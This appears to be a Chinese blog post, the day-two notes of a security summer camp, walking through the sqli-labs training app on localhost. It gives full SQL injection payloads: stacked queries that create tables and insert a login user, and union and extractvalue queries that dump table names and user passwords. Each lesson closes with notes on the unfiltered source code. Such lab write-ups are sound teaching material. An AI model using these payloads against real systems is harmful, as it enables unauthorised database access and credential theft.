@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+    <!--Description-->
+
+    
+
+    
+        <meta name="description" content="堆叠注入
+1）概念      Stacked injections:堆叠注入。从名词的含义就可以看到应该是一堆sql语句（多条）一起执行。而在真实的运用中也是这样的，在mysql中，主要是命令行中，每一条语句结尾加分号;来表示语句结束。这样我们就想到了是不是可以多句一起使用。这个就叫做stacked"/>
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="John Doe"/>
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="网安夏令营day2"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="堆叠注入
+1）概念      Stacked injections:堆叠注入。从名词的含义就可以看到应该是一堆sql语句（多条）一起执行。而在真实的运用中也是这样的，在mysql中，主要是命令行中，每一条语句结尾加分号;来表示语句结束。这样我们就想到了是不是可以多句一起使用。这个就叫做stacked"/>
+    
+
+    <!--Open Graph Site Name-->
+        <meta property="og:site_name" content="Hexo"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article"/>
+    
+
+    <!--Page Cover-->
+    
+    
+        <meta property="og:image" content="http://example.comimg/home-bg.jpg"/>
+    
+
+        <meta name="twitter:card" content="summary_large_image"/>
+
+    
+
+    
+        <meta name="twitter:image" content="http://example.comimg/home-bg.jpg"/>
+    
+
+    <!-- Title -->
+    
+    <title>网安夏令营day2 - Hexo</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet"/>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
+    <link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css"/>
+    <link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css"/>
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+    <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet"/>
+
+    <!-- Google Analytics -->
+    
+
+
+    <!-- favicon -->
+    
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Configurable Title</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+            <ul class="nav navbar-nav navbar-right">
+                
+                    <li>
+                        <a href="/">
+                            
+                                Home
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/archives">
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/tags">
+                            
+                                Tags
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/categories">
+                            
+                                Categories
+                            
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a target="_blank" rel="noopener" href="https://github.com/klugjo/hexo-theme-clean-blog">
+                            
+                                <i class="fa fa-github fa-stack-2x"></i>
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
+<header class="intro-header" style="background-image: url('/img/home-bg.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <h1>网安夏令营day2</h1>
+                    
+                    <span class="meta">
+                        <!-- Date and Author -->
+                        
+                        
+                            2021-07-23
+                        
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Tags and categories -->
+           
+
+            <!-- Gallery -->
+            
+
+            <!-- Post Main Content -->
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <p>堆叠注入</p>
+<p>1）概念<br>      Stacked injections:堆叠注入。从名词的含义就可以看到应该是一堆sql语句（多条）一起执行。而在真实的运用中也是这样的，在mysql中，主要是命令行中，每一条语句结尾加分号;来表示语句结束。这样我们就想到了是不是可以多句一起使用。这个就叫做stacked injection。</p>
+<p>2）堆叠注入使用条件<br>      堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行。</p>
+<p>关于SQL基础语句<br>      增：insert into tableName(columnName1,columnName2) values(value1,value2)</p>
+<pre><code>  删：delete from tableName where …
+
+  改：update tableName set columnName=value where …
+
+  查：select * from tableName where …
+</code></pre>
+<p><strong>实验步骤一</strong></p>
+<p>我们的任务分为2个部分：</p>
+<p>首先先根据报错或注入测试分析出SQL语句中如何闭合参数，同时我们构造语句闭合前面的参数进行堆叠注入。</p>
+<ol>
+<li>任务一中是基于GET型的堆叠注入。</li>
+<li>任务二中是基于POST型的堆叠注入。</li>
+</ol>
+<p>任务描述： 基于GET型的堆叠注入。</p>
+<ol>
+<li>  启动phpstudy，打开<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/">http://localhost/sqli-labs-master/</a> 点击page-3 stacked injections，打开less-38 GET-Stacked Query injection-string。</li>
+<li>  页面提示我们将id作为参数，我们加入参数后，在值后面加入特殊字符，比如单引号，来测试是否具有sql漏洞，且测试参数为字符型还是数字型：localhost/sqli-labs-master/Less-38/?id=1’</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=1d512109-a200-416f-8bd6-6e22725681c1.png"></p>
+<p>看到蓝色标记处，提示我们多了一个单引号，故可知该参数闭合为单引号闭合。</p>
+<ol start="3">
+<li>  我们尝试在当前查询后面加入分号，构造下一条sql语句。比如此处我们创建一个新的数据表，表中有一个列为id：localhost/sqli-labs-master/Less-38/?id=1’;create table less38(id int(3))%23</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=0af3ce57-c819-4d83-b68f-b8e543fd62cd.png">  </p>
+<ol start="4">
+<li><p>我们来到后台phpstudy中的mysql命令行，来验证是否sql语句执行成功。</p>
+<p>  mysql&gt;show databases;</p>
+<p>  mysql&gt;use security</p>
+<p>  mysql&gt;show tables;</p>
+</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=338e737a-16ab-434c-a2c9-bde7c1d45ea5.png"></p>
+<p> 可以看到语句成功执行，创建了less38的数据表。</p>
+<ol start="5">
+<li>  我们可以做的操作就不止于此，通过一些其他方式，实验者可以自由发挥，可手工注入，可工具注入，得知查询sql语句所在的数据库为security，数据表为users，列名分别为id、username、password，如此，我们可以试着添加一个新的用户进去。localhost/sqli-labs-master/Less-38/?id=1’; insert into users values (‘100’,’less38’,’heetian’)%23</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=5bb32837-366b-46b8-a6fe-5063a70af731.png"></p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=f88469ec-2864-48e9-8a0d-93ba3519ae46.png"></p>
+<ol start="6">
+<li> Less-39、less-40实验步骤和less-38是一样的，通过插入特殊字符报错发现只是参数闭合不一样。实验者自行实验。less-41中错误不回显，这时我们可以通过构造sql语句的真假，而页面返回不一样来判断出了参数为整型，那我们在语句后加上分号，之后和less-38一样，如图：localhost/sqli-labs-master/Less-41/?id=1;insert into users values(‘101’,’less41’,’heetian’)–+</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=d3377dcc-d7de-4cf9-aa1e-8140806fb07a.png"></p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=d1620d83-9116-42f4-a69e-e888977d871a.png"></p>
+<ol start="7">
+<li> 切换到less-41的后台源代码中来分析漏洞产生的原因：</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=cd9e1f6e-b4b4-4d5b-ac56-3e8055f7b168.png"></p>
+<p>可以看到在46行源代码中传入参数没有做任何防护，且在48行查询时使用mysqli_multi_query函数进行sql查询。我们直接输入特殊字符分号，加上我们需要执行的sql语句，后台数据库直接代入sql语句执行。</p>
+<p><strong>实验步骤二</strong></p>
+<p>基于POST型的堆叠注入</p>
+<ol>
+<li> 打开lesson-42，可以看到界面和之前不一样，任务一中我们直接在url上构建sql注入语句，属于get型，less-42是在表单中提交我们构造的sql语句，属于post型。</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=be0a55f6-4ec9-4c66-a7fb-4a4c375614b8.png"></p>
+<ol start="2">
+<li>  我们尝试使用弱口令进行注入，发现密码处能进行注入。我们猜测后台sql查询语句为select * from users where username=’$username’ and password=’$password’，其中username可能做了过滤，而password处没有做过滤，那我们尝试在password处进行堆叠注入。</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=b44980ce-45a2-4b82-a232-2f7503136b43.png"></p>
+<ol start="3">
+<li>  我们在密码处直接用分号结束上一条sql语句，接着创建less42这个数据表。</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=665b9dd4-eb67-46eb-a5e6-95b5d5cf1a74.png"></p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=af439646-361e-4bc8-ae0b-eec12c1e21e6.png"></p>
+<p>我们看到后台数据库中已经创建该数据表。</p>
+<ol start="4">
+<li>  同样在密码处我们尝试进行其他操作。比如增加一个用户到users表中。username随便输入，password密码处直接输入’;insert into users values(‘110’,’less42’,’heetian’)#</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=51f199e9-6852-47e3-b699-dadf8060fd24.png"> </p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=6e3f3c5d-1f74-4885-8832-d89ef5312faf.png"></p>
+<p>后台数据库中已经插入，我们尝试使用自己添加的用户名密码登陆。</p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=f23922ab-06c1-47d2-bca8-b54cc5e16dae.png"></p>
+<p>可以看到已经登陆成功。</p>
+<ol start="5">
+<li>  我们切换到后台源代码中来分析漏洞产生的原因：</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=64c65b3a-ddac-43f2-aa6e-1e184676a72f.png"> </p>
+<p>在21、22行可以看到和我们猜测的一样，在username参数传入后使用mysql_real_escape_string做了一次过滤。而在password中直接传入后没有做任何过滤，直接代入了sql查询语句。同样在34行进行查询时使用了mysqli_multi_query函数进行查询，导致堆叠注入可能实现。</p>
+<ol start="6">
+<li>  less43、less44、less45和less42原理一样，望实验者自行实验。</li>
+</ol>
+<p>SQL</p>
+<p>1）SQL注入介绍<br>      SQLI，sql injection，我们称之为 sql 注入。何为 sql，英文：Structured Query Language，叫做结构化查询语言。常见的结构化数据库有MySQL，MS SQL ,Oracle以及Postgresql。Sql语言就是我们在管理数据库时用到的一种。在我们的应用系统使用 sql 语句进行管理应用数据库时，往往采用拼接的方式形成一条完整的数据库语言，而危险的是，在拼接sql语句的时候，我们可以改变sql 语句。从而让数据执行我们想要执行的语句，这就是我们常说的sql注入。</p>
+<p>2）关于SQL基础语句<br>      增：insert into tableName(columnName1,columnName2) values(value1,value2)</p>
+<pre><code>  删：delete from tableName where …
+
+  改：update tableName set columnName=value where …
+
+  查：select * from tableName where …
+</code></pre>
+<p>3）Information_schema数据库基本表说明：</p>
+<p>schemata表：提供了当前mysql实例中所有的数据库信息，show databases的结果就是从该表得出。</p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=03177d30-4d1c-4aa2-8dd2-e6db3419c92e.jpg"></p>
+<p>tables表：提供了关于数据库中的所有表的信息，即表属于哪个schema，表的创建时间、表的类型等，show tables from schemaName的结果就是从该表得出。</p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=e35e2cc4-bbeb-419e-9db1-31dc6a8c98e3.png"></p>
+<p>columns表：提供表中所有列信息，即表明了表中所有列及每列的信息，show columns from schemaName.tableName的结果就是从该表得出。</p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=ddaafa8d-e149-424c-90a6-7024e0561a22.png"> </p>
+<p><strong>实验步骤一</strong></p>
+<p>我们的任务分为4个部分：</p>
+<p>分别根据返回的报错信息的不同，构造语句进行注入。都是依照表–&gt;列–&gt;值的顺序来进行爆破。</p>
+<p>任务描述： 突破lesson-1的实验，按照表-&gt;列-&gt;值的顺序。最后查看后台源代码。</p>
+<ol>
+<li>  启动phpstudy，打开<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/">http://localhost/sqli-labs-master/</a> 点击page-1后：</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=650beade-5303-44a3-9b95-a942621e98af.png"></p>
+<ol start="2">
+<li>  点击GET-error based-single quotes-string less-1，进入如下图实验界面：</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=59dc23cd-3d7b-4a7b-aec4-0c12a93c0fc3.png"></p>
+<ol start="3">
+<li>  根据提示加入id参数在url中</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=286a4d64-b83c-40cf-bb2d-18ec651ba8a6.png"></p>
+<ol start="4">
+<li>  根据lesson-1的名称：基于字符型的报错注入，加入单引号进行测试（实际测试过程中也常加单引号进行测试），在页面上出现提示信息，该提示信息告诉我们，在id值1的后面多加了一个单引号，引发报错，根据提示信息，我们可以发现sql语句是使用单引号闭合，故利用这一点我们可以闭合前面单引号，使用联合查询查看。</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=3a59287a-80ac-498d-ab4a-9a8d8d45507d.png"></p>
+<ol start="5">
+<li>  使用联合查询，先判断当前数据表中的列数。在浏览器地址栏中输入<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-1/?id=-1&#39;+union+select+1,2,3--+">http://localhost/sqli-labs-master/Less-1/?id=-1&#39;+union+select+1,2,3--+</a> 其中+号用来代替空格（此处也可直接使用空格），– 符用来注释后面的sql语句；id取值为-1使得前面的sql语句不能返回任何结果集，故页面中会显示出union select的结果。可以看到列数为3时不报错（列数为3是测出来的，不会一下子得出），表明当前数据表的列数（字段数）为3列，且显示的位置为第2,3个字段。</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=ce4dccbc-e3b4-4efa-a1e5-1f8e207ffd6b.png">  </p>
+<ol start="6">
+<li><p>  我们可以在第二或第三个字段中用version()函数代替，查看当前数据库的版本，得出版本为5.5.53（<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-1/?id=-1&#39;+union+select+1,version(),3--+%EF%BC%89%E6%95%85%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%B0%9D%E8%AF%95%E5%88%A9%E7%94%A8information_schema%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9D%A5%E6%9F%A5%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E8%A1%A8%E5%90%8D%E3%80%81%E5%88%97%E5%90%8D%E4%BB%A5%E5%8F%8A%E5%AF%B9%E5%BA%94%E5%80%BC%E3%80%82">http://localhost/sqli-labs-master/Less-1/?id=-1&#39;+union+select+1,version(),3--+）故我们可以尝试利用information_schema数据库来查当前数据库中的表名、列名以及对应值。</a></p>
+</li>
+<li><p>  先查询数据库中所有表名，输入<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-1/?id=-1&#39;+union+select+1,group_concat(table_name),3+from+information_schema.tables+where+table_schema=database()--+%E5%88%A9%E7%94%A8group_concat%E5%87%BD%E6%95%B0%E8%BF%9E%E6%8E%A5%E4%B8%80%E7%BB%84%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%8Cdatabase()%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E3%80%82">http://localhost/sqli-labs-master/Less-1/?id=-1&#39;+union+select+1,group_concat(table_name),3+from+information_schema.tables+where+table_schema=database()--+利用group_concat函数连接一组字符串，database()函数返回当前数据库。</a></p>
+</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=88756f45-39fb-4ffc-8a50-75a35c248a83.png"></p>
+<ol start="8">
+<li>  得到表名之后猜测users表中可能有敏感信息，尝试爆出users表的列名:</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-1/?id=-1&#39;union">http://localhost/sqli-labs-master/Less-1/?id=-1&#39;union</a> select 1,group_concat(column_name),3 from information_schema.columns wheretable_name=’users’ and table_schema=database()–+</p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=5f9e3763-1947-4a66-9a83-3875c246c6c6.png"></p>
+<ol start="9">
+<li>  开始根据得出的列名爆值：<br><a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-1/?id=-1&#39;+union+select+1,group_concat(id,0x3a,username,0x7e,password),3+from+users--+%E5%85%B6%E4%B8%AD0x3a%E8%A1%A8%E7%A4%BA:%EF%BC%8C0x7e%E8%A1%A8%E7%A4%BA">http://localhost/sqli-labs-master/Less-1/?id=-1&#39;+union+select+1,group_concat(id,0x3a,username,0x7e,password),3+from+users--+其中0x3a表示:，0x7e表示</a>~</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=1e432e35-6bb0-48b4-b4f1-fff694e97ec9.png"></p>
+<ol start="10">
+<li> 切换到代码中来分析漏洞产生的原因：</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=5170267c-22d7-4448-a811-ba671ebe8f15.png"></p>
+<p>可以看到在源代码中没有做任何防护，我们可以在构建SQL语句时闭合前面单引号，注释掉后面的内容就可添加我们的内容。</p>
+<p><strong>实验步骤二</strong></p>
+<p>任务描述： 突破lesson-2的实验，按照表-&gt;列-&gt;值的顺序。最后查看后台源代码。</p>
+<ol>
+<li>  打开lesson-2，加入参数id，同时加入一个单引号，查看报错情况。</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=fa6f207b-9b6e-4f08-b582-557456b93d45.png"></p>
+<p>可以看到发生错误的原因是多了一个单引号，当我们去掉单引号时正常显示，说明可能是数字型注入。接下来可以按照实验任务一中的步骤进行爆值，这儿避免重复用另一种方式。</p>
+<ol start="2">
+<li>  使用extractvalue函数进行报错注入，<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-2/?id=-1">http://localhost/sqli-labs-master/Less-2/?id=-1</a> and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))–+可以看到这条相比上一步中查表名时，id=1后没有加单引号。</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=13ae5915-8187-4664-be62-32df62c225db.png"> </p>
+<ol start="3">
+<li>  接下来的步骤和任务一中的步骤一样，只是替换掉extractvalue函数中xpath部分的查询语句即可。这里便不再重复，提供注入的URL。<br><a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-2/?id=-1">http://localhost/sqli-labs-master/Less-2/?id=-1</a> and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=’users’ and table_schema=database())))–+</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=9066b340-c34e-4b28-b0bd-186f86b7aa64.png"></p>
+<p><a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-2/?id=-1">http://localhost/sqli-labs-master/Less-2/?id=-1</a> and extractvalue(1,concat(0x7e,(select group_concat(id,0x3a,username,0x7e,password)from users)))–+</p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=947f994b-58d0-4e5f-9857-8056cc19f518.png"></p>
+<p><a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-2/?id=-1">http://localhost/sqli-labs-master/Less-2/?id=-1</a> and extractvalue(1,concat(0x7e,(select group_concat(id,0x3a,username,0x7e,password) from users where username not in(‘Dumb’,’Angelina’))))–+</p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=9a37d7e1-d6ed-4a0e-8c81-f0a9b2e510d7.png"></p>
+<ol start="4">
+<li>  切换到代码中来分析漏洞产生的原因：</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=97c040a3-b49e-45e4-99fe-3ff98677c9c3.png"></p>
+<p> 同样没有做任何过滤，在where字段中也仅仅是id等于直接输入的数据，没有像任务一中的闭合，故在此处加单引号会报错。</p>
+<p><strong>实验步骤三</strong></p>
+<p>任务描述： 突破lesson-3的实验，按照表-&gt;列-&gt;值的顺序。最后查看后台源代码。</p>
+<ol>
+<li>  打开lesson-3，同样根据提示加上参数id，同时加入单引号查看报错情况。</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=53725d6a-0583-44df-893a-638499bf2ce4.png"></p>
+<p>可以看到这次多加了单引号及右括号，当我们输入时加入这两个字符就可以闭合查询语句中的符号，从而使用联合查询或者其他报错函数来查询我们自己的语句。这儿的注入步骤和前面的一样，就不赘述。读者自行尝试。</p>
+<ol start="2">
+<li>  同样来到代码中，分析代码：</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=81d32204-d3d2-4495-b6aa-56f3beca3620.png"></p>
+<p> 可以看到没有做任何防护，使用单引号加括号闭合。</p>
+<p><strong>实验步骤四</strong></p>
+<p>任务描述： 突破lesson-4的实验，按照表-&gt;列-&gt;值的顺序。最后查看后台源代码。</p>
+<ol>
+<li>  打开lesson-4，同样根据提示加上参数id，同时根据名称加入双引号查看报错情况。<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-4/?id=1%E2%80%9D">http://localhost/sqli-labs-master/Less-4/?id=1”</a></li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=d5389768-136c-48d4-a683-a2a78a449f8f.png"></p>
+<p>可以根据报错情况得出该语句使用双引号加括号闭合，我们用<a target="_blank" rel="noopener" href="http://localhost/sqli-labs-master/Less-4/?id=1&quot;)--+%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%AD%A3%E5%B8%B8%E6%98%BE%E7%A4%BA%E4%BA%86%E3%80%82">http://localhost/sqli-labs-master/Less-4/?id=1&quot;)--+可以看到正常显示了。</a></p>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=4b00332c-ff51-47ea-ad0f-2a264df6efd1.png"></p>
+<ol start="2">
+<li>可同样根据前面的步骤自行查询。</li>
+<li>  来到代码阶段，分析代码：</li>
+</ol>
+<p><img src="https://www.hetianlab.com/headImg.action?guideImg=2b778b57-11e1-4e9a-9da3-5690b5cc5866.png"></p>
+<p>可以看到id用双引号包起来之后，传入SQL查询语句。</p>
+
+
+                
+            </div>
+
+            <!-- Comments -->
+            
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    
+
+
+                </div>
+            
+        </div>
+    </div>
+</article>
+
+    <!-- Footer -->
+    <hr />
+
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                    
+
+                    
+
+                    
+                        <li>
+                            <a href="https://github.com/klugjo/hexo-theme-clean-blog" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+
+                    
+
+                    
+                </ul>
+                <p class="copyright text-muted">&copy; 2021 John Doe<br></p>
+                <p class="copyright text-muted">Original Theme <a target="_blank" href="http://startbootstrap.com/template-overviews/clean-blog/">Clean Blog</a> from <a href="http://startbootstrap.com/" target="_blank">Start Bootstrap</a></p>
+                <p class="copyright text-muted">Adapted for <a target="_blank" href="https://hexo.io/">Hexo</a> by <a href="http://www.codeblocq.com/" target="_blank">Jonathan Klughertz</a></p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+    <!-- After footer scripts -->
+    
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
